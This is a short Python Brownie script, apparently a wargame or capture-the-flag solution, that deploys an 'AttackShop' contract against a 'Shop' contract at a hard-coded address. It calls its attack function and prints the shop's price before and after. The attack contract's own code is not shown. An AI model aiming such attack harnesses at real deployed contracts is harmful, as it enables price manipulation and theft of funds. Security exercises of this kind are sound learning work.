from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import Shop, AttackShop, network, Contract
from web3 import Web3
from web3.auto import w3


def deploy_Shop():
    acc1 = get_account(index=1)
    shop = Shop.deploy(
        {"from": acc1},
    )
    return shop


def deploy_AttackShop(shop):
    account = get_account()
    attack_contract = AttackShop.deploy(
        shop,
        {"from": account},
    )
    return attack_contract


def main():
    print(network.show_active())
    account = get_account()

    # shop = deploy_Shop()
    shop_address = "0x1a4dca3CF36825210AffFc815407Ac48e3bd4A7E"
    shop = Contract.from_abi(Shop._name, shop_address, Shop.abi)

    attack_contract = deploy_AttackShop(shop)

    print(f"Price? : {shop.price()}")

    attack_contract.attack({"from": account})

    print(f"Price? : {shop.price()}")
